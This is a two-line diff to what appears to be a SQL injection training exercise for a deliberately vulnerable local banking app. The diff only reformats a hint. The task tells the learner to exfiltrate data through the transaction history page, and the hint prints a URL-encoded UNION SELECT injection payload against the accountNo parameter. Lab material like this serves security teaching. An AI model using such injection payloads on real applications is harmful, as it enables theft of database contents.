@@ -40,5 +40,5 @@ using below input on login page:
 
 ### Task
 Use the transaction history page to exfiltrate data with SQL injection: http://vbank.0.0.0.0.xip.io:8080/history?accountNo=ACCOUNT_NO (where account no is the SQL injectable parameter).
-Hint: http://vbank.0.0.0.0.xip.io:8080/history?accountNo=%27%20UNION%20SELECT%20%271%27,%272%27,%273%27,%274%27,%275%27,%276%27,%277%27%20--
+* Hint: http://vbank.0.0.0.0.xip.io:8080/history?accountNo=%27%20UNION%20SELECT%20%271%27,%272%27,%273%27,%274%27,%275%27,%276%27,%277%27%20--
 
